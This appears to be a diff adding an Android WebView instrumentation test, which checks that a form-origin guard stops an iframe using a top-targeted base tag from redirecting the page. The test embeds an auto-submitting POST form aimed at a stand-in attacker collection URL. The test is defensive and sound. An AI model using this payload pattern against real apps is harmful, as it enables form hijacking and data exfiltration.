@@ -99,4 +99,68 @@ class SafeWebViewPostOriginGuardTest {
             }
         }
     }
+
+    @Test
+    fun iframeBaseTargetCannotOverrideTheValidatedTopLevelOrigin() {
+        assumeTrue(
+            "The emulator WebView must support document-start JavaScript.",
+            WebViewFeature.isFeatureSupported(WebViewFeature.DOCUMENT_START_SCRIPT)
+        )
+
+        val instrumentation = InstrumentationRegistry.getInstrumentation()
+        val context = instrumentation.targetContext
+        val completed = CountDownLatch(1)
+        val result = AtomicReference<String?>(null)
+        lateinit var webView: WebView
+
+        instrumentation.runOnMainSync {
+            webView = WebView(context).apply {
+                settings.javaScriptEnabled = true
+                WebViewCompat.addDocumentStartJavaScript(
+                    this,
+                    buildMainFrameFormOriginGuard("https://sitebin.test/"),
+                    setOf("*")
+                )
+                webViewClient = object : WebViewClient() {
+                    override fun onPageFinished(view: WebView?, url: String?) {
+                        view?.evaluateJavascript(
+                            """
+                            (function () {
+                                const frame = document.createElement('iframe');
+                                frame.srcdoc = '<base target="_top"><form id="f" method="POST" action="https://attacker.invalid/collect"></form><script>document.getElementById("f").submit();<\\/script>';
+                                document.body.appendChild(frame);
+                                return true;
+                            })();
+                            """.trimIndent()
+                        ) {
+                            view.postDelayed({
+                                view.evaluateJavascript("window.location.href") { currentUrl ->
+                                    result.set(currentUrl)
+                                    completed.countDown()
+                                }
+                            }, 750L)
+                        }
+                    }
+                }
+                loadDataWithBaseURL(
+                    "https://sitebin.test/",
+                    "<!doctype html><html><head></head><body></body></html>",
+                    "text/html",
+                    "UTF-8",
+                    null
+                )
+            }
+        }
+
+        try {
+            assertTrue("WebView did not finish the base-target test page.", completed.await(10, TimeUnit.SECONDS))
+            assertEquals("\\\"https://sitebin.test/\\\"", result.get())
+        } finally {
+            instrumentation.runOnMainSync {
+                webView.stopLoading()
+                webView.destroy()
+            }
+        }
+    }
+
 }
